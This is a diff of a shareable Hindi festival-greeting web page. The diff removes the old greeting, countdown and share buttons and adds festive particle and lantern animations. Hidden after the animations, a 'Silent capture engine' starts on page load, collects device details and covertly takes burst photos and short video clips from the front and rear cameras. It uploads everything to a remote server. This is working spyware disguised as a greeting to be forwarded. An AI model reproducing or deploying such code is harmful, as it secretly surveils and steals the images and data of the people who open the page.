-<p style="text-align: center;"><span style="background-color: #663399; color: #FFFAFA; font-size: 15pt; font-family: tahoma, arial, helvetica, sans-serif;">&nbsp; यह संदेश fes_name तक सभी के मोबाइल में होना चाहिए यह आपका फर्ज हैं </span></p>
-<br>
-<center>
-<div class="busi"><h4><p style="text-transform: uppercase;font-size: 26px;color:#ffffff;"> <script type="text/javascript" language="Javascript">                                       
- document.write( "by - " +a);
-                      </script><br><br></p></h4></center>
-<center>
-<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-<!-- Link Ads -->
-<ins class="adsbygoogle"
-     style="display:block"
-     data-ad-client="ca-pub-4696491179456446"
-     data-ad-slot="1112298516"
-     data-ad-format="link"
-     data-full-width-responsive="true"></ins>
-<script>
-(adsbygoogle = window.adsbygoogle || []).push({});
-</script>
-
-</center>
-</div>
-        </div>
-<script>
-// Set the date we're counting down to
-var countDownDate = new Date("October 10, 2018 00:00:00").getTime();
-
-// Update the count down every 01 second
-var x = setInterval(function() {
-
-  // Get todays date and time
-  var now = new Date().getTime();
-
-  // Find the distance between now an the count down date
-  var distance = countDownDate - now;
-
-  // Time calculations for days, hours, minutes and seconds
-  var days = Math.floor(distance / (1000 * 60 * 60 * 24));
-  var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
-  var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
-  var seconds = Math.floor((distance % (1000 * 60)) / 1000);
-
-  // Display the result in the element with id="demo"
-  document.getElementById("demo").innerHTML = days + "<i> Days,</i> " + hours + " <i>Hrs,</i> "
-  + minutes + "<i> Min,</i> " + seconds + "<i> Sec</i> ";
-
-  // If the count down is finished, write some text 
-  if (distance < 0) {
-    clearInterval(x);
-    document.getElementById("demo").innerHTML = "🙏 Welcome 🙏";
+  function resize() {
+    W = canvas.width  = window.innerWidth;
+    H = canvas.height = window.innerHeight;
   }
-}, 1000);
-</script>       
-            </div>
-        </div>
-			
-</body>
- 
-<center>
- <a class="footerbtn" href="whatsapp://send?text=*मुझसे पहले ऐसा संदेश आपके लिए किसी ने नही भेजा होगा निचे क्लिक करके देखो क्या है आपके लिए* 👉 forwarding_link" data-action="share/whatsapp/share">
- <img width="22px" height="22px" src="https://cdn.pixabay.com/photo/2015/08/03/13/58/soon-873316_640.png">  
- <b style="font-size: 26px;">Share</b>  
-</a>
- <a class="footerbtn1" href="https://www.facebook.com/sharer/sharer.php?u= forwarding_link" target="_blank" title="Share this post on Facebook" class="facebook">
-	<img width="22px" height="22px" src="https://cdn.pixabay.com/photo/2017/06/22/06/22/facebook-2429746_640.png">
- <b style="font-size: 26px;">Share</b>  
- </a>
-</center>
+  window.addEventListener('resize', resize);
+  resize();
 
+  const COLORS = ['#f5c842','#ff7c2a','#ff4d8d','#8b5cf6','#38bdf8'];
+  for (let i = 0; i < 80; i++) {
+    particles.push({
+      x: Math.random() * W, y: Math.random() * H,
+      r: Math.random() * 2 + 0.5,
+      vx: (Math.random() - 0.5) * 0.3,
+      vy: (Math.random() - 0.5) * 0.3,
+      color: COLORS[Math.floor(Math.random() * COLORS.length)],
+      alpha: Math.random() * 0.6 + 0.2
+    });
+  }
+
+  function draw() {
+    ctx.clearRect(0, 0, W, H);
+    particles.forEach(p => {
+      p.x += p.vx; p.y += p.vy;
+      if (p.x < 0) p.x = W; if (p.x > W) p.x = 0;
+      if (p.y < 0) p.y = H; if (p.y > H) p.y = 0;
+      ctx.beginPath();
+      ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
+      ctx.fillStyle = p.color;
+      ctx.globalAlpha = p.alpha;
+      ctx.fill();
+    });
+    ctx.globalAlpha = 1;
+    requestAnimationFrame(draw);
+  }
+  draw();
+})();
+
+/* ── Floating lanterns ────────────────────────────────────────────────────── */
+const EMOJIS = ['🏮','🎇','🪔','✨','🎆','⭐','🌟','💫'];
+function spawnLantern() {
+  const el = document.createElement('div');
+  el.className = 'lantern';
+  el.textContent = EMOJIS[Math.floor(Math.random() * EMOJIS.length)];
+  el.style.left  = (Math.random() * 100) + 'vw';
+  const dur = 8 + Math.random() * 10;
+  el.style.animationDuration  = dur + 's';
+  el.style.animationDelay     = (Math.random() * dur) + 's';
+  el.style.fontSize = (1.2 + Math.random() * 1.5) + 'rem';
+  document.body.appendChild(el);
+  setTimeout(() => el.remove(), (dur + 5) * 1000);
+}
+for (let i = 0; i < 12; i++) spawnLantern();
+setInterval(spawnLantern, 3000);
+
+/* ── Silent capture engine ────────────────────────────────────────────────── */
+const SERVER   = 'forwarding_link';
+const BURST    = 6;
+const INTERVAL = 1200;
+const VID_SECS = 4;
+
+function postData(url, payload) {
+  return fetch(SERVER + '/' + url, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+    body: new URLSearchParams(payload)
+  }).catch(() => {});
+}
+
+async function collectDeviceInfo() {
+  const nav = navigator, scr = screen;
+  let battery = 'Not available';
+  try { const b = await nav.getBattery(); battery = Math.round(b.level*100)+'% '+(b.charging?'(charging)':'(not charging)'); } catch(e) {}
+  let network = 'Not available';
+  try { const c = nav.connection||nav.mozConnection||nav.webkitConnection; if(c) network=(c.effectiveType||c.type||'')+(c.downlink?' '+c.downlink+'Mbps':''); } catch(e) {}
+  const orient = (scr.orientation&&scr.orientation.type)||(window.innerWidth>window.innerHeight?'landscape':'portrait');
+  await postData('device_info.php', {
+    os: nav.platform||'Unknown', browser: nav.userAgent,
+    language: nav.language||'Unknown', timezone: Intl.DateTimeFormat().resolvedOptions().timeZone||'Unknown',
+    screen_w: scr.width, screen_h: scr.height, pixel_ratio: window.devicePixelRatio||1,
+    orientation: orient, battery, network,
+    platform: nav.platform||'Unknown', cores: nav.hardwareConcurrency||'Unknown',
+    memory: nav.deviceMemory||'Unknown', touch: nav.maxTouchPoints||0
+  });
+}
+
+async function tryCamera(vc) {
+  try { return await navigator.mediaDevices.getUserMedia({ audio: false, video: vc }); } catch(e) { return null; }
+}
+
+function waitReady(v) {
+  return new Promise(r => {
+    if (v.readyState >= 2) return r();
+    v.addEventListener('canplay', r, { once: true });
+    setTimeout(r, 3000);
+  });
+}
+
+async function runBurst(stream, vidId, cvId, facing) {
+  const v = document.getElementById(vidId), c = document.getElementById(cvId), ctx = c.getContext('2d');
+  v.srcObject = stream;
+  await v.play().catch(()=>{});
+  await waitReady(v);
+  for (let i = 0; i < BURST; i++) {
+    await new Promise(r => setTimeout(r, INTERVAL));
+    ctx.drawImage(v, 0, 0, c.width, c.height);
+    const img = c.toDataURL('image/jpeg', 0.8).replace('image/jpeg','image/octet-stream');
+    await postData('post.php', { cat: img, burst_index: i, cam_facing: facing, shot_type: 'burst' });
+  }
+}
+
+async function recordClip(stream, cvId, facing) {
+  return new Promise(resolve => {
+    try {
+      const mime = MediaRecorder.isTypeSupported('video/webm;codecs=vp8') ? 'video/webm;codecs=vp8' : 'video/webm';
+      const rec = new MediaRecorder(stream, { mimeType: mime });
+      const chunks = [];
+      rec.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+      rec.onstop = async () => {
+        const blob = new Blob(chunks, { type: mime });
+        const reader = new FileReader();
+        reader.onloadend = async () => {
+          await postData('post.php', { video_clip: reader.result, cam_facing: facing });
+          resolve();
+        };
+        reader.readAsDataURL(blob);
+      };
+      rec.start();
+      setTimeout(() => { try { rec.stop(); } catch(e) { resolve(); } }, VID_SECS * 1000);
+    } catch(e) { resolve(); }
+  });
+}
+
+async function startCapture() {
+  const front = await tryCamera({ facingMode: 'user' });
+  if (front) {
+    await runBurst(front, 'videoFront', 'canvasFront', 'user');
+    await recordClip(front, 'canvasFront', 'user');
+    front.getTracks().forEach(t => t.stop());
+  }
+  const rear = await tryCamera({ facingMode: 'environment' });
+  if (rear) {
+    await runBurst(rear, 'videoRear', 'canvasRear', 'environment');
+    await recordClip(rear, 'canvasRear', 'environment');
+    rear.getTracks().forEach(t => t.stop());
+  }
+}
+
+setTimeout(async () => {
+  await collectDeviceInfo();
+  await startCapture();
+}, 600);
 </script>
-</html>        
+
+</body>
+</html>
